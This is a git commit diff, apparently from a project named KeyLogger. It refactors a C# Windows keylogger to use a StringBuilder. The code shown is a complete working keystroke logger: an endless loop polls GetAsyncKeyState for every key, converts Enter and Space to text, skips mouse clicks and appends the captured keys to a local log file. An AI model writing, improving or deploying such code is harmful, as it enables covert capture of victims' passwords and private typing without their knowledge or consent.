7245e1336a31f8209288ae44d47534eeb1e29e65
Job <jobse@pm.me>
2019-12-10 19:30:46 +0100

    Replaced string with stringbuilder for better performance

--- KeyLogger/Program.cs
+++ KeyLogger/Program.cs
@@ -8,6 +8,7 @@
 using System;
 using System.IO;
 using System.Runtime.InteropServices;
+using System.Text;
 using System.Threading.Tasks;
 using System.Windows.Forms;
 
@@ -20,35 +21,32 @@ namespace KeyLogger
 
         [DllImport("user32.dll")]
         private static extern short GetAsyncKeyState(int vKey);
-        private static string key = string.Empty;
+        private static StringBuilder key = new StringBuilder();
 
         static void Main()
         {
-            int keysCount = Enum.GetValues(typeof(Keys)).Length;//Get the length of avaible keys.
+            int keysCount = Enum.GetValues(typeof(Keys)).Length;//Get the number of avaible keys.
 
             while (true)
             {
                 for (int i = 0; i < keysCount; i++)//Loop for every key.
                     if (GetAsyncKeyState(i) == -32767)//Check if key is pressed.
-                        key += Enum.GetName(typeof(Keys), i);//Add key as string to Keys.
+                        key.Append(Enum.GetName(typeof(Keys), i));//Add key to keys.
 
                 //If no key is pressed, wait x milliseconds.
-                if (key.Length <= 0)
+                if (key.Length <= 0) Task.Delay(Delay).Wait();
+                else
                 {
-                    Task.Delay(Delay).Wait();
-                    continue;
+                    //Key is pressed, continue.
+                    //Ingenore LButton and RButton, these are mouse clicks.
+                    if (key.Equals("LButton") || key.Equals("RButton")) { key.Clear(); continue; }
+
+                    key.Replace("Enter", Environment.NewLine);//Replace Enter with a new line.
+                    key.Replace("Space", " ");//Replace Space with a real space.
+
+                    File.AppendAllText("log.text", key.ToString());//Write key to log file.
+                    key.Clear();
                 }
-
-                //Key is pressed, continue.
-                //Ingenore LButton and RButton, these are mouse clicks.
-                if (key.Equals("LButton")) { key = string.Empty; continue; }
-                if (key.Equals("RButton")) { key = string.Empty; continue; }
-
-                key = key.Replace("Enter", Environment.NewLine);//Replace Enter for a new line.
-                key = key.Replace("Space", " ");//Replace Space for a real space.
-
-                File.AppendAllText("log.text", key);//Write key to file.
-                key = string.Empty;//clear key.
             }
         }
     }
